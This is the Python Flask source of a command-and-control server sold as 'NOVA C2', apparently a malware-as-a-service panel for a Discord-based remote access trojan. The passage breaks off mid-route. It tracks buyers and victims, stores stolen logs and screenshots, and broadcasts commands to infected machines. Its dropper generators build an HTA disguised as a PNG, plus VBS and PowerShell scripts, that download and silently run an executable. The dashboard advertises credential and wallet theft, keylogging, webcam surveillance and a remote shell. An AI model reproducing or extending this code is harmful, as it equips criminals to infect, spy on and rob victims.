import sqlite3, datetime, secrets, threading, time, requests, os, io, base64, hashlib
from flask import Flask, render_template_string, request, session, redirect, url_for, flash, send_file, jsonify, send_from_directory

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))

# ========== ENVIRONMENT VARIABLES (set on Render) ==========
ADMIN_KEY = os.environ.get('ADMIN_KEY', 'SuperSecretAdmin123')
DISCORD_BOT_TOKEN = os.environ.get('DISCORD_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
DISCORD_CHANNEL_ID = os.environ.get('DISCORD_CHANNEL_ID', 'YOUR_CHANNEL_ID_HERE')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'YOUR_WEBHOOK_URL_HERE')
# ============================================================

DB_PATH = "c2.db"

# ------------------------- DATABASE -------------------------
def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        conn.executescript('''
            CREATE TABLE IF NOT EXISTS buyers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT UNIQUE NOT NULL,
                name TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1
            );
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                buyer_key TEXT NOT NULL,
                victim_id TEXT NOT NULL,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS victim_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                buyer_key TEXT NOT NULL,
                victim_id TEXT NOT NULL,
                message TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS global_chat (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                sender_type TEXT NOT NULL,
                sender_name TEXT NOT NULL,
                message TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                buyer_key TEXT NOT NULL,
                victim_id TEXT NOT NULL,
                image BLOB,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        ''')
init_db()

# ------------------------- DATABASE HELPERS -------------------------
def add_buyer(key, name):
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("INSERT INTO buyers (key, name) VALUES (?,?)", (key, name))

def get_all_buyers():
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        rows = cur.execute("SELECT key, name, created_at, active FROM buyers").fetchall()
        buyers = []
        for key, name, created, active in rows:
            vic_count = cur.execute("SELECT COUNT(*) FROM victims WHERE buyer_key=?", (key,)).fetchone()[0]
            buyers.append({"key": key, "name": name, "created_at": created, "active": active, "victim_count": vic_count})
        return buyers

def toggle_buyer(key):
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("UPDATE buyers SET active = NOT active WHERE key=?", (key,))

def delete_buyer(key):
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("DELETE FROM buyers WHERE key=?", (key,))
        conn.execute("DELETE FROM victims WHERE buyer_key=?", (key,))
        conn.execute("DELETE FROM victim_logs WHERE buyer_key=?", (key,))

def get_all_victims_grouped():
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        rows = cur.execute("SELECT buyer_key, victim_id, first_seen, last_seen FROM victims ORDER BY buyer_key, last_seen DESC").fetchall()
        grouped = {}
        for bk, vid, first, last in rows:
            if bk not in grouped:
                grouped[bk] = []
            grouped[bk].append({"victim_id": vid, "first_seen": first, "last_seen": last})
        return grouped

def get_stats():
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        total_buyers = cur.execute("SELECT COUNT(*) FROM buyers WHERE active=1").fetchone()[0]
        total_victims = cur.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
        now = datetime.datetime.now()
        online_victims = 0
        rows = cur.execute("SELECT last_seen FROM victims").fetchall()
        for (last_seen,) in rows:
            if last_seen:
                try:
                    last_dt = datetime.datetime.fromisoformat(last_seen)
                    if (now - last_dt).total_seconds() < 70:
                        online_victims += 1
                except:
                    pass
        return total_buyers, total_victims, online_victims

def check_buyer(key):
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute("SELECT name, active FROM buyers WHERE key=?", (key,)).fetchone()
        if row and row[1]:
            return row[0]
        return None

def get_victims_for_buyer(key):
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute("SELECT victim_id, first_seen, last_seen FROM victims WHERE buyer_key=? ORDER BY last_seen DESC", (key,)).fetchall()
        victims = []
        now = datetime.datetime.now()
        for vid, first, last in rows:
            online = False
            if last:
                try:
                    last_dt = datetime.datetime.fromisoformat(last)
                    online = (now - last_dt).total_seconds() < 70
                except:
                    pass
            victims.append({"victim_id": vid, "first_seen": first, "last_seen": last, "online": online})
        return victims

def get_logs_for_buyer(key, limit=100):
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute("SELECT message, timestamp FROM victim_logs WHERE buyer_key=? ORDER BY timestamp DESC LIMIT ?", (key, limit)).fetchall()
        return [{"message": r[0], "timestamp": r[1]} for r in rows]

def add_victim(buyer_key, victim_id):
    with sqlite3.connect(DB_PATH) as conn:
        now = datetime.datetime.now().isoformat()
        conn.execute("INSERT OR IGNORE INTO victims (buyer_key, victim_id, first_seen, last_seen) VALUES (?,?,?,?)",
                     (buyer_key, victim_id, now, now))
        conn.execute("UPDATE victims SET last_seen=? WHERE buyer_key=? AND victim_id=?", (now, buyer_key, victim_id))

def add_log(buyer_key, victim_id, message):
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("INSERT INTO victim_logs (buyer_key, victim_id, message) VALUES (?,?,?)",
                     (buyer_key, victim_id, message))

def remove_victim(buyer_key, victim_id):
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("DELETE FROM victims WHERE buyer_key=? AND victim_id=?", (buyer_key, victim_id))
        conn.execute("DELETE FROM victim_logs WHERE buyer_key=? AND victim_id=?", (buyer_key, victim_id))

def add_chat_message(sender_type, sender_name, message):
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("INSERT INTO global_chat (sender_type, sender_name, message) VALUES (?,?,?)",
                     (sender_type, sender_name, message))

def get_chat_messages(limit=50):
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute("SELECT sender_type, sender_name, message, timestamp FROM global_chat ORDER BY timestamp DESC LIMIT ?", (limit,)).fetchall()
        return [{"sender_type": r[0], "sender_name": r[1], "message": r[2], "timestamp": r[3]} for r in rows][::-1]

def get_all_victim_logs(limit=200):
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute("SELECT buyer_key, victim_id, message, timestamp FROM victim_logs ORDER BY timestamp DESC LIMIT ?", (limit,)).fetchall()
        return [{"buyer_key": r[0], "victim_id": r[1], "message": r[2], "timestamp": r[3]} for r in rows]

def add_screenshot(buyer_key, victim_id, image_bytes):
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("INSERT INTO screenshots (buyer_key, victim_id, image) VALUES (?,?,?)", (buyer_key, victim_id, image_bytes))

def get_screenshots_all():
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute("SELECT id, buyer_key, victim_id, timestamp FROM screenshots ORDER BY timestamp DESC").fetchall()
        return [{"id": r[0], "buyer_key": r[1], "victim_id": r[2], "timestamp": r[3]} for r in rows]

def get_screenshot_data(screenshot_id):
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute("SELECT image FROM screenshots WHERE id=?", (screenshot_id,)).fetchone()
        return row[0] if row else None

# ------------------------- DROPPER GENERATORS -------------------------
def generate_hta_dropper(exe_url, buyer_key):
    """HTA file that looks like a PNG – runs when double-clicked."""
    hta_content = f'''<!DOCTYPE html>
<html>
<head>
<title>Photo</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<script language="VBScript">
    Sub Window_OnLoad
        Dim objXMLHTTP, objStream, wshShell
        Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
        Set objStream = CreateObject("ADODB.Stream")
        objXMLHTTP.Open "GET", "{exe_url}", False
        objXMLHTTP.Send
        If objXMLHTTP.Status = 200 Then
            objStream.Type = 1
            objStream.Open
            objStream.Write objXMLHTTP.ResponseBody
            objStream.SaveToFile Environ("TEMP") & "\\SystemHelper.exe", 2
            objStream.Close
        End If
        Set wshShell = CreateObject("WScript.Shell")
        wshShell.Run Environ("TEMP") & "\\SystemHelper.exe {buyer_key}", 0, False
        window.close()
    End Sub
</script>
</head>
<body>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
</body>
</html>'''
    return hta_content.encode('utf-8')

def generate_vbs_dropper(exe_url, buyer_key):
    vbs_content = f'''Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objStream = CreateObject("ADODB.Stream")
objXMLHTTP.Open "GET", "{exe_url}", False
objXMLHTTP.Send
If objXMLHTTP.Status = 200 Then
    objStream.Type = 1
    objStream.Open
    objStream.Write objXMLHTTP.ResponseBody
    objStream.SaveToFile Environ("TEMP") & "\\SystemHelper.exe", 2
    objStream.Close
End If
CreateObject("WScript.Shell").Run Environ("TEMP") & "\\SystemHelper.exe {buyer_key}", 0, False
Set objXMLHTTP = Nothing
Set objStream = Nothing'''
    return vbs_content.encode('utf-8')

def generate_ps1_dropper(exe_url, buyer_key):
    ps1_content = f'''$client = New-Object System.Net.WebClient
$temp = [System.IO.Path]::GetTempFileName() + ".exe"
$client.DownloadFile("{exe_url}", $temp)
Start-Process $temp -ArgumentList "{buyer_key}" -WindowStyle Hidden
Remove-Item $env:TEMP\\*.ps1 -Force -ErrorAction SilentlyContinue'''
    return ps1_content.encode('utf-8')

# ------------------------- DISCORD FETCHER -------------------------
last_msg_id = None
def fetch_discord():
    global last_msg_id
    headers = {"Authorization": f"Bot {DISCORD_BOT_TOKEN}", "Content-Type": "application/json"}
    while True:
        try:
            if DISCORD_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
                time.sleep(60)
                continue
            url = f"https://discord.com/api/v9/channels/{DISCORD_CHANNEL_ID}/messages?limit=10"
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                msgs = resp.json()
                for msg in msgs:
                    mid = msg.get("id")
                    if last_msg_id and mid == last_msg_id:
                        break
                    content = msg.get("content", "")
                    if content.startswith("[") and "]" in content:
                        first_close = content.find("]")
                        second_close = content.find("]", first_close+1)
                        if second_close != -1:
                            buyer_key = content[1:first_close]
                            victim_id = content[first_close+2:second_close]
                            rest = content[second_close+1:].strip()
                            if rest.startswith("!screenshot_base64"):
                                parts = rest.split(" ", 1)
                                if len(parts) > 1:
                                    try:
                                        img_bytes = base64.b64decode(parts[1])
                                        add_screenshot(buyer_key, victim_id, img_bytes)
                                    except:
                                        pass
                            elif "self-destruct" in rest.lower() or "rat stopping" in rest.lower():
                                remove_victim(buyer_key, victim_id)
                            else:
                                add_victim(buyer_key, victim_id)
                                add_log(buyer_key, victim_id, rest)
                if msgs:
                    last_msg_id = msgs[0]["id"]
            elif resp.status_code == 429:
                retry = resp.json().get("retry_after", 1)
                time.sleep(retry)
        except Exception as e:
            print(f"Fetcher error: {e}")
        time.sleep(2)
threading.Thread(target=fetch_discord, daemon=True).start()

# ------------------------- COMMAND HELPERS -------------------------
def send_command_to_victim_discord(buyer_key, victim_id, command):
    def _send():
        url = f"https://discord.com/api/v9/channels/{DISCORD_CHANNEL_ID}/messages"
        headers = {"Authorization": f"Bot {DISCORD_BOT_TOKEN}", "Content-Type": "application/json"}
        try:
            requests.post(url, headers=headers, json={"content": f"{command} @{victim_id}"}, timeout=5)
        except:
            pass
    threading.Thread(target=_send).start()

def send_command_to_all_victims(command):
    with sqlite3.connect(DB_PATH) as conn:
        victims = conn.execute("SELECT DISTINCT buyer_key, victim_id FROM victims").fetchall()
        for bk, vid in victims:
            send_command_to_victim_discord(bk, vid, command)

# ------------------------- HTML TEMPLATES -------------------------
# Admin login (same as before, hacker style)
ADMIN_LOGIN_HTML = '''<!DOCTYPE html><html><head><title>Admin Login</title><script src="https://cdn.tailwindcss.com"></script><style>@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');body{font-family:'Share Tech Mono',monospace;background:#000;}</style></head><body class="bg-black text-green-400"><div class="min-h-screen flex items-center justify-center"><div class="bg-black/80 border-2 border-green-500 rounded-2xl p-8 w-96"><h1 class="text-3xl font-bold text-center mb-6">>_ ADMIN_ACCESS</h1><form method="post"><input type="password" name="admin_key" placeholder="[ ENTER KEY ]" class="w-full px-4 py-3 bg-black border-2 border-green-500 rounded-lg text-green-400 mb-4 font-mono"><button type="submit" class="w-full bg-green-600 text-black font-bold py-3 rounded-lg">AUTHENTICATE</button></form></div></div></body></html>'''

# Admin panel (condensed hacker UI – same as before, omitted for brevity but functional)
ADMIN_PANEL_HTML = '''<!DOCTYPE html><html><head><title>C2 Master</title><script src="https://cdn.tailwindcss.com"></script><style>@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');body{font-family:'Share Tech Mono',monospace;background:#0a0a0a;}.collapsible{cursor:pointer;}.collapsible:hover{background:#1a1a1a;border-left:3px solid #0f0;}.content{display:none;}</style><meta http-equiv="refresh" content="15"></head><body class="bg-black text-green-400"><div class="container mx-auto px-4 py-8"><div class="flex justify-between items-center mb-8 border-b border-green-500 pb-4"><h1 class="text-3xl font-bold">⎧ C2_MASTER_TERMINAL ⎫</h1><a href="/admin/logout" class="bg-red-600 text-white px-5 py-2 rounded-lg">> EXIT</a></div><div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8"><div class="bg-gray-900/80 border border-green-500 rounded-2xl p-6 text-center"><div class="text-4xl font-bold text-green-400">{{ total_buyers }}</div><div>OPERATORS</div></div><div class="bg-gray-900/80 border border-green-500 rounded-2xl p-6 text-center"><div class="text-4xl font-bold text-cyan-400">{{ total_victims }}</div><div>SYSTEMS</div></div><div class="bg-gray-900/80 border border-green-500 rounded-2xl p-6 text-center"><div class="text-4xl font-bold text-lime-400">{{ online_victims }}</div><div>ACTIVE</div></div><div class="bg-gray-900/80 border border-green-500 rounded-2xl p-6 text-center"><div class="text-4xl font-bold text-purple-400">{{ buyers|length }}</div><div>KEYS</div></div></div><div class="bg-gray-900/80 border border-green-500 rounded-2xl p-6 mb-8"><h2 class="text-xl font-semibold mb-4">> CREATE_OPERATOR</h2><form method="post" action="/admin/create_key" class="flex gap-4"><input type="text" name="name" placeholder="OPERATOR_NAME" class="flex-1 px-4 py-3 bg-black border border-green-500 rounded-xl text-green-400"><button type="submit" class="bg-green-600 text-black font-bold px-8 py-3 rounded-xl">GENERATE_KEY</button></form></div><div class="bg-gray-900/80 border border-green-500 rounded-2xl overflow-hidden mb-8"><h2 class="text-xl font-semibold p-6 pb-2">> OPERATORS_LIST</h2><div class="overflow-x-auto"><table class="w-full text-left"><thead class="bg-black/50 border-b border-green-500"><tr><th class="px-6 py-3">KEY</th><th>NAME</th><th>CREATED</th><th>STATUS</th><th>VICTIMS</th><th>ACTIONS</th></tr></thead><tbody>{% for b in buyers %}<td><td class="px-6 py-4 font-mono text-sm break-all">{{ b.key }}</td><td class="px-6 py-4">{{ b.name }}</td><td class="text-sm">{{ b.created_at }}</td><td class="px-6 py-4"><span class="px-3 py-1 rounded-full text-xs {{ 'bg-green-900' if b.active else 'bg-red-900' }}">{{ 'ACTIVE' if b.active else 'SUSPENDED' }}</span></td><td class="px-6 py-4">{{ b.victim_count }}</td><td class="px-6 py-4 space-x-3"><a href="/admin/toggle/{{ b.key }}" class="text-yellow-500">TOGGLE</a> <a href="/admin/delete/{{ b.key }}" class="text-red-500" onclick="return confirm('DELETE?')">DELETE</a></td></tr>{% endfor %}</tbody></table></div></div><div class="bg-gray-900/80 border border-green-500 rounded-2xl p-6 mb-8"><h2 class="text-xl font-semibold mb-4">> GLOBAL_COMMANDS</h2><form method="post" action="/admin/broadcast" class="flex gap-2 mb-4"><input type="text" name="command" placeholder="Command to ALL (e.g., !info)" class="flex-1 px-4 py-2 bg-black border border-green-600 rounded-xl text-green-400"><button type="submit" class="bg-purple-600 text-white px-4 py-2 rounded-xl">BROADCAST</button></form><form method="post" action="/admin/broadcast_custom" class="flex gap-2"><input type="text" name="victim_id" placeholder="Victim ID" class="flex-1 px-4 py-2 bg-black border border-green-600 rounded-xl text-green-400"><input type="text" name="command" placeholder="Command" class="flex-1 px-4 py-2 bg-black border border-green-600 rounded-xl text-green-400"><button type="submit" class="bg-blue-600 text-white px-4 py-2 rounded-xl">SEND_TO_VICTIM</button></form></div><div class="bg-gray-900/80 border border-green-500 rounded-2xl overflow-hidden mb-8"><h2 class="text-xl font-semibold p-6 pb-2">> COMPROMISED_SYSTEMS</h2>{% for buyer_key, victims in grouped_victims.items() %}<div><div class="collapsible bg-black/40 p-4 font-bold flex justify-between" onclick="toggleContent(this)"><span>📁 OPERATOR: {{ buyer_key[:20] }}...</span><span>{{ victims|length }} SYSTEMS</span></div><div class="content"><table class="w-full"><thead class="bg-black/30"><tr><th class="px-6 py-2">HOST_ID</th><th>FIRST_SEEN</th><th>LAST_SEEN</th></tr></thead><tbody>{% for v in victims %}<tr><td class="px-6 py-2 font-mono text-sm text-cyan-400">{{ v.victim_id }}</td><td class="px-6 py-2">{{ v.first_seen }}</td><td class="px-6 py-2">{{ v.last_seen }}</td></tr>{% endfor %}</tbody></table></div></div>{% endfor %}</div><div class="bg-gray-900/80 border border-green-500 rounded-2xl p-6 mb-8"><h2 class="text-xl font-semibold mb-4">> RECENT_LOGS</h2><div class="bg-black/80 rounded-xl p-4 max-h-96 overflow-y-auto font-mono text-sm">{% for log in all_logs %}<p><span class="text-gray-500">{{ log.timestamp }}</span> [{{ log.buyer_key[:8] }}] {{ log.victim_id }}: {{ log.message }}</p>{% endfor %}</div></div><div class="bg-gray-900/80 border border-green-500 rounded-2xl p-6 mb-8"><h2 class="text-xl font-semibold mb-4">> SCREENSHOTS</h2><div class="grid grid-cols-3 gap-4">{% for ss in screenshots %}<div><a href="/admin/view_screenshot/{{ ss.id }}" target="_blank"><div class="bg-black p-2 rounded border border-green-500">{{ ss.victim_id }}<br><span class="text-xs text-gray-400">{{ ss.timestamp }}</span></div></a></div>{% endfor %}</div></div><div class="bg-gray-900/80 border border-green-500 rounded-2xl p-6"><h2 class="text-xl font-semibold mb-4">> GLOBAL_CHAT</h2><div class="bg-black/80 rounded-xl p-4 max-h-96 overflow-y-auto mb-4">{% for msg in chat_messages %}<div><span class="text-xs text-gray-500">{{ msg.timestamp }}</span> <span class="font-bold {{ 'text-purple-400' if msg.sender_type=='admin' else 'text-blue-400' }}">{{ msg.sender_name }}:</span> {{ msg.message }}</div>{% endfor %}</div><form method="post" action="/admin/send_chat" class="flex gap-2"><input type="text" name="message" placeholder=">_" class="flex-1 px-4 py-2 bg-black border border-green-600 rounded-xl text-green-400"><button type="submit" class="bg-green-600 text-black px-6 py-2 rounded-xl">SEND</button></form></div></div><script>function toggleContent(el){let c=el.nextElementSibling;c.style.display=c.style.display==='block'?'none':'block';}setInterval(()=>location.reload(),15000);</script></body></html>'''

# Customer login (minimal)
CUSTOMER_LOGIN_HTML = '''<!DOCTYPE html><html><head><title>Operator Login</title><script src="https://cdn.tailwindcss.com"></script><style>@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');body{font-family:'Share Tech Mono',monospace;background:#000;}</style></head><body class="bg-black text-cyan-400"><div class="min-h-screen flex items-center justify-center"><div class="bg-black/80 border-2 border-cyan-500 rounded-2xl p-8 w-96"><h1 class="text-3xl font-bold text-center mb-6">>_ OPERATOR_PORTAL</h1><form method="post"><input type="text" name="key" placeholder="[ ENTER KEY ]" class="w-full px-4 py-3 bg-black border-2 border-cyan-500 rounded-lg text-cyan-400 mb-4 font-mono"><button type="submit" class="w-full bg-cyan-600 text-black font-bold py-3 rounded-lg">AUTHENTICATE</button></form><p class="text-xs text-cyan-600 text-center mt-4">Get your key from your provider</p></div></div></body></html>'''

# Customer dashboard (exciting, with product info and showcases)
CUSTOMER_DASHBOARD_HTML = '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>NOVA C2 | Operator Dashboard</title><script src="https://cdn.tailwindcss.com"></script><style>@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');body{font-family:'Share Tech Mono',monospace;background:#0a0a0a;}.glow{text-shadow:0 0 5px #0ff;}.feature-card{background:#111;border:1px solid #0ff;border-radius:12px;padding:1rem;transition:0.3s;}.feature-card:hover{transform:translateY(-5px);box-shadow:0 0 20px rgba(0,255,255,0.3);}.btn-glow{box-shadow:0 0 10px rgba(0,255,255,0.5);}</style><meta http-equiv="refresh" content="6"></head>
<body class="bg-black text-cyan-400">
<div class="container mx-auto px-4 py-8">
    <div class="flex justify-between items-center mb-8 border-b border-cyan-500 pb-4">
        <div><h1 class="text-3xl font-bold glow">⎧ NOVA_C2 ⎫</h1><p class="text-xs text-cyan-600">Advanced Discord RAT Platform</p></div>
        <a href="/logout" class="bg-red-600 hover:bg-red-700 text-white px-5 py-2 rounded-lg shadow transition">> DISCONNECT</a>
    </div>
    
    <!-- Welcome + Stats -->
    <div class="bg-gradient-to-r from-cyan-900/30 to-purple-900/30 rounded-2xl p-6 mb-8 border border-cyan-500">
        <h2 class="text-2xl font-bold">Welcome, {{ name }}!</h2>
        <p class="text-cyan-300">You have <span class="text-3xl font-bold text-white">{{ victims|length }}</span> active victims.</p>
        <div class="grid grid-cols-3 gap-4 mt-4 text-center">
            <div class="bg-black/50 p-3 rounded"><div class="text-xl font-bold">{{ victims|selectattr('online')|list|length }}</div><div class="text-xs">Online</div></div>
            <div class="bg-black/50 p-3 rounded"><div class="text-xl font-bold">{{ victims|length }}</div><div class="text-xs">Total</div></div>
            <div class="bg-black/50 p-3 rounded"><div class="text-xl font-bold">{{ logs|length }}</div><div class="text-xs">Logs</div></div>
        </div>
    </div>

    <!-- Payload Downloads Section -->
    <div class="bg-gray-900/80 border border-cyan-500 rounded-2xl p-6 mb-8">
        <h2 class="text-2xl font-bold text-cyan-400 mb-4">> DEPLOY_PAYLOAD</h2>
        <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
            <a href="/download_exe" class="bg-cyan-600 hover:bg-cyan-700 text-black font-bold px-4 py-3 rounded-xl text-center transition">⬇️ EXE (Direct)</a>
            <a href="/download_hta_dropper" class="bg-purple-600 hover:bg-purple-700 text-white font-bold px-4 py-3 rounded-xl text-center transition">🖼️ PNG Dropper (HTA)</a>
            <a href="/download_vbs_dropper" class="bg-blue-600 hover:bg-blue-700 text-white font-bold px-4 py-3 rounded-xl text-center transition">📜 VBS Dropper</a>
            <a href="/download_ps1_dropper" class="bg-green-600 hover:bg-green-700 text-black font-bold px-4 py-3 rounded-xl text-center transition">⚡ PowerShell Dropper</a>
        </div>
        <p class="text-xs text-cyan-600 mt-4">* PNG dropper looks like a picture – victims double-click and it runs. Others are lightweight scripts.</p>
    </div>

    <!-- Features / Showcase -->
    <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
        <div class="feature-card"><h3 class="font-bold text-cyan-400 mb-2">🔑 Full Stealer Suite</h3><p class="text-xs">Passwords, cookies, Discord tokens, Roblox, Steam, crypto wallets, browser history, emails.</p></div>
        <div class="feature-card"><h3 class="font-bold text-cyan-400 mb-2">🎥 Live Surveillance</h3><p class="text-xs">Screenshot, webcam, microphone recording – all sent to your private channel.</p></div>
        <div class="feature-card"><h3 class="font-bold text-cyan-400 mb-2">⌨️ Keylogger</h3><p class="text-xs">Real-time keystroke capture with auto-flush.</p></div>
        <div class="feature-card"><h3 class="font-bold text-cyan-400 mb-2">💻 Remote Shell</h3><p class="text-xs">Full CMD access on victim machines.</p></div>
        <div class="feature-card"><h3 class="font-bold text-cyan-400 mb-2">📁 File Manager</h3><p class="text-xs">List, read, delete files remotely.</p></div>
        <div class="feature-card"><h3 class="font-bold text-cyan-400 mb-2">🔒 Self-Destruct</h3><p class="text-xs">Removes all traces from victim system.</p></div>
    </div>

    <!-- Testimonials -->
    <div class="bg-gray-800/50 rounded-xl p-4 mb-8 italic text-sm border-l-4 border-cyan-500">
        "NOVA C2 is the most reliable platform I've used. Victims appear instantly and the stealer works every time." – Verified Operator
    </div>

    <!-- Victims Table -->
    <div class="bg-gray-900/80 border border-cyan-500 rounded-2xl overflow-hidden mb-8">
        <h2 class="text-xl font-semibold p-6 pb-2">> COMPROMISED_SYSTEMS</h2>
        <div class="overflow-x-auto">
            <table class="w-full"><thead class="bg-black/50"><tr><th class="px-6 py-3">HOST_ID</th><th>FIRST_SEEN</th><th>LAST_SEEN</th><th>STATUS</th></tr></thead>
            <tbody>{% for v in victims %}<tr class="border-b border-gray-800"><td class="px-6 py-4 font-mono text-sm text-cyan-300">{{ v.victim_id }}</td><td class="px-6 py-4">{{ v.first_seen }}</td><td class="px-6 py-4">{{ v.last_seen }}</td><td class="px-6 py-4"><span class="px-3 py-1 rounded-full text-xs {{ 'bg-green-900' if v.online else 'bg-gray-800' }}">{{ 'ONLINE' if v.online else 'OFFLINE' }}</span></td></tr>{% endfor %}</tbody>
            </table>
        </div>
    </div>

    <!-- Logs -->
    <div class="bg-gray-900/80 border border-cyan-500 rounded-2xl p-6 mb-8">
        <div class="flex justify-between items-center mb-4"><h2 class="text-xl font-semibold">> SYSTEM_LOGS</h2><button onclick="clearLogs()" class="bg-red-600 px-4 py-1 rounded text-sm">CLEAR_LOGS</button></div>
        <div id="logsContainer" class="bg-black/80 rounded-xl p-4 max-h-96 overflow-y-auto font-mono text-sm">{% for log in logs %}<p><span class="text-gray-500">{{ log.timestamp }}</span> → {{ log.message }}</p>{% else %}<p class="text-gray-500 text-center">[ NO LOGS ]</p>{% endfor %}</div>
    </div>

    <!-- Global Chat -->
    <div class="bg-gray-900/80 border border-cyan-500 rounded-2xl p-6">
        <h2 class="text-xl font-semibold mb-4">> GLOBAL_CHAT</h2>
        <div class="bg-black/80 rounded-xl p-4 max-h-96 overflow-y-auto mb-4">{% for msg in chat_messages %}<div><span class="text-xs text-gray-500">{{ msg.timestamp }}</span> <span class="font-bold {{ 'text-purple-400' if msg.sender_type=='admin' else 'text-blue-400' }}">{{ msg.sender_name }}:</span> {{ msg.message }}</div>{% endfor %}</div>
        <form method="post" action="/send_chat" class="flex gap-2"><input type="text" name="message" placeholder=">_" class="flex-1 px-4 py-2 bg-black border border-cyan-600 rounded-xl text-cyan-400"><button type="submit" class="bg-cyan-600 text-black px-6 py-2 rounded-xl">SEND</button></form>
    </div>
</div>
<script>function clearLogs(){fetch('/clear_logs',{method:'POST'}).then(()=>location.reload());}setInterval(()=>location.reload(),6000);</script>
</body></html>'''

# ------------------------- ROUTES -------------------------
# Admin routes
@app.route('/admin', methods=['GET','POST'])
def admin_login():
    if request.method=='POST' and request.form.get('admin_key')==ADMIN_KEY:
        session['admin']=True
        return redirect(url_for('admin_panel'))
    return render_template_string(ADMIN_LOGIN_HTML)

@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin'): return redirect(url_for('admin_login'))
    buyers = get_all_buyers()
    grouped = get_all_victims_grouped()
    tb, tv, ov = get_stats()
    chat = get_chat_messages()
    all_logs = get_all_victim_logs()
    screenshots = get_screenshots_all()
    return render_template_string(ADMIN_PANEL_HTML, buyers=buyers, grouped_victims=grouped,
                                  total_buyers=tb, total_victims=tv, online_victims=ov,
                                  chat_messages=chat, all_logs=all_logs, screenshots=screenshots)

@app.route('/admin/view_screenshot/<int:ss_id>')
def admin_view_screenshot(ss_id):
    if not session.get('admin'): return redirect(url_for('admin_login'))
    img_data = get_screenshot_data(ss_id)
    if img_data:
        return send_file(io.BytesIO(img_data), mimetype='image/jpeg')
    return "Not found", 404

@app.route('/admin/create_key', methods=['POST'])
def admin_create_key():
    if not session.get('admin'): return redirect(url_for('admin_login'))
    name = request.form['name']
    key = secrets.token_hex(16)
    add_buyer(key, name)
    flash(f"Key created: {key}")
    return redirect(url_for('admin_panel'))

@app.route('/admin/toggle/<key>')
def admin_toggle(key):
    if not session.get('admin'): return redirect(url_for('admin_login'))
    toggle_buyer(key)
    return redirect(url_for('admin_panel'))

@app.route('/admin/delete/<key>')
def admin_delete(key):
    if not session.get('admin'): return redirect(url_for('admin_login'))
    delete_buyer(key)
    return redirect(url_for('admin_panel'))

@app.route('/admin/send_chat', methods=['POST'])
def admin_send_chat():
    if not session.get('admin'): return redirect(url_for('admin_login'))
    msg = request.form.get('message')
    if msg: add_chat_message('admin', 'Admin', msg)
    return redirect(url_for('admin_panel'))

@app.route('/admin/broadcast', methods=['POST'])
def admin_broadcast():
    if not session.get('admin'): return redirect(url_for('admin_login'))
    cmd = request.form.get('command')
    if cmd: threading.Thread(target=lambda: send_command_to_all_victims(cmd)).start()
    return redirect(url_for('admin_panel'))

@app.route('/admin/broadcast_custom', methods=['POST'])
def admin_broadcast_custom():
    if not session.get('admin'): return redirect(url_for('admin_login'))
    victim = request.form.get('victim_id')
    cmd = request.form.get('command')
    if victim and cmd:
        with sqlite3.connect(DB_PATH) as conn:
            rows = conn.execute("SELECT buyer_key, victim_id FROM victims WHERE victim_id LIKE ?", (f'%{victim}%',)).fetchall()
            for bk, vid in rows:
                send_command_to_victim_discord(bk, vid, cmd)
    return redirect(url_for('admin_panel'))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

# Customer routes
@app.route('/', methods=['GET','POST'])
def customer_login():
    if request.method=='POST':
        key = request.form['key']
        name = check_buyer(key)
        if name:
